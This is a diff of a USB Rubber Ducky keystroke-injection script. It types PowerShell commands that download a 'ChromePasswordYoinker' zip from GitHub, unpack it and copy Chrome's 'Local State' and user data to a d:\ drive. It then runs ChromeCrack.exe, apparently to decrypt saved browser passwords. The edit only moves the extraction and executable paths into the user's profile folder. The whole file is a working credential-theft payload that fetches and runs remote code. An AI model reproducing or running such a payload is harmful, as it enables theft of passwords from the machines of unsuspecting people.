@@ -7,7 +7,7 @@ DELAY 800
 STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile 'C:\Users\$env:UserName\ChromeCracker.zip'
 ENTER
 DELAY 800
-STRING Expand-Archive C:\Users\$env:UserName\ChromeCracker.zip -DestinationPath c:\ChromeCracker -Force
+STRING Expand-Archive C:\Users\$env:UserName\ChromeCracker.zip -DestinationPath C:\Users\$env:UserName\ChromeCracker -Force
 ENTER
 DELAY 800
 STRING New-Item -ItemType "directory" -Name "$env:UserName" -Path "d:\" -Force
@@ -22,7 +22,7 @@ DELAY 800
 STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "d:\$env:UserName\"
 ENTER
 DELAY 800
-STRING c:\ChromeCrack\ChromeCrack\ChromeCrack.exe $env:UserName
+STRING C:\Users\$env:UserName\ChromeCrack\ChromeCrack\ChromeCrack.exe $env:UserName
 ENTER
 DELAY 800
 STRING exit
